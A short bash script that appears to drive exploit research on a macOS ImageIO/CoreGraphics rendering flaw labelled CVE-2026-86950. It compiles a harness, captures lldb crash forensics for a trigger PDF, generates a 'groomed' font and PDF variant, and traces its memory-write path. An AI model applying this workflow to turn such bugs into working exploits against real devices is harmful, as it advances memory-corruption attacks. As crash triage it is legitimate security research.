#!/bin/bash
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
# --- A) crash variant: memory forensics at fault ---
lldb -b \
  -k "thread backtrace 3" \
  -k "register read x9 x11 x16 x19 x22 x25 x26" \
  -k "memory read --size 8 --format x --count 12 '$x22'" \
  -k "memory read --size 8 --format x --count 16 '$x19-0x100'" \
  -k "memory read --size 8 --format x --count 8 '$x16-0x40'" \
  -k "detach" -k "quit" \
  -o "process launch -- trigger.pdf" \
  ./render > j1_crash.txt 2>&1
tail -3 j1_crash.txt
# --- B) groomed survivor: breakpoint trace through the write path ---
python3 -m venv venv 2>/dev/null; ./venv/bin/pip -q install fonttools 2>&1 | tail -1
./venv/bin/python - << 'PYEOF'
import sys; sys.path.insert(0, '.')
from sweep import gen_font_h, gen_pdf
gen_font_h('j1.ttf', n=12, dx=40, upm=16384, k=32, line_len=38, n_lines=1, neg_y=False)
gen_pdf('j1.pdf', 'j1.ttf', ptsize=1024, k=32, ftf=128)
print('j1 variant generated')
PYEOF
lldb -b \
  -o "process launch -- j1.pdf" \
  -o "command script import $PWD/../../../jtrace.py" \
  ./render > j1_survive.txt 2>&1 || true
grep -c "\[hit" j1_survive.txt || true
tail -8 j1_survive.txt
cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/j1_*.txt findings/
cp detonation/cg-extract/jtrace.py findings/
ls -la findings/
